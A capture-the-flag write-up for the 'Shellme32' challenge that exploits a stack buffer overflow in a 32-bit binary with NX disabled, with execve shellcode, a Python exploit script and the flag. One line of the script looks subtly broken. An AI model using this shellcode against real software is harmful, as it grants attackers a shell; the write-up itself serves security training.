Shellme32
> One small step for hacker's, one giant leap for pwning kind.

Solved by Vanilla

We use Radare2 to inspect the binary.  (s main; af; pdf)  The binary leaks the location of the stack (information disclosure), then uses read(2) to read 0x40 bytes into a buffer that is at most 0x24 bytes long, meaning there is a stack-based buffer overflow vulnerability.  It also prints a message about shellcode.  The binary has NX disabled (see Radare2's "iI" command output), so we can use shellcode.

A standard execve("/bin/sh") shellcode can be gotten off the Internet; I started with https://www.exploit-db.com/shellcodes/46809 and made a few modifications so it worked (the shellcode as-written there does not set EDX (the environ parameter to execve), so it fails as-is).

The final shellcode we used was:

; vim:ft=fasm
use32

; https://www.exploit-db.com/shellcodes/46809
xor    ecx,ecx
push   11
pop    eax
push   ecx
mov    ecx,esp
mov    edx,esp
push   '/sh'
push   '/bin'
mov    ebx,esp
int    80h
int3

Then I inserted this into an exploit script:

#!/usr/bin/env python3
import struct
import vanillib

SHELLCODE = open('scode.bin', 'rb').read()

def exploit(iface):
    iface.expect(b"Shellcode... Can you say shellcode?\n")
    address = int(iface.read_until(b"\n", include=False), 16)
    iface.expect(b"> ")
    padded_scode = SHELLCODE + b"\xCC" * ((-len(SHELLCODE)) % 4)
    iface.write(padded_scode + struct.pack('<I', address) * ((0x40: len(padded_scode)) // 4) + b"exec sh -il 2>&1\n")
    iface.interact()

main = vanillib.stub_main(exploit)

if __name__ == "__main__":
    main()

Flag: TUCTF{4www..._b4by5_f1r57_3xpl017._h0w_cu73}

